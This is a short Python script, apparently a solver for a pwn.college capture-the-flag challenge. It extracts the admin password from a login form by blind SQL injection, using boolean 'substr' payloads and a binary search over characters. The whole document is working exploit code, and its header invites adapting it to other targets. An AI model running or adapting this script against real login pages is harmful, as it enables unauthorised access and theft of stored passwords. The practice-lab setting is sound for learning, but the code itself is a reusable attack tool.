# Blind SQL injection CTF from pwncollege 
# Change characters, payload, and request-function if you want to use it on another problem 

import requests
import string 
import math


characters = list('-.' + string.digits + string.ascii_uppercase + '_' + string.ascii_lowercase + '{}') 

def request(payload):
    data = {'username': 'admin', 'password': {payload}}
    r_post = requests.post('http://challenge.localhost', data=data)
    return r_post


def binary_search(chars, letter=1, flag=''):
    flag_temp = flag 
    length = len(chars)
    mid = math.ceil(length/2)
    guess = chars[mid]


    payload = f"' OR username = 'admin' AND  substr(password,{letter},1) > '{guess}'--"
    r_post = request(payload=payload)

    if r_post.status_code == 200:
        chars = chars[mid:]
        return binary_search(chars=chars, letter=letter, flag=flag_temp)

    elif r_post.status_code != 200:
        payload = f"' OR username = 'admin' AND substr(password,{letter},1) = '{guess}'--"
        r_post_check = request(payload=payload)
        
        if r_post_check.status_code == 200:
            flag_temp += guess
            print(f"Temp flag: {flag_temp}")
       

            letter += 1
            if guess == '}':
                print(f"Found final character - Flag: {flag_temp}")
                return flag_temp 
            else:
                return binary_search(chars=characters, letter=letter, flag=flag_temp)
            

        chars = chars[:mid]
        binary_search(chars=chars, letter=letter, flag=flag_temp)

   

flag = binary_search(chars=characters)
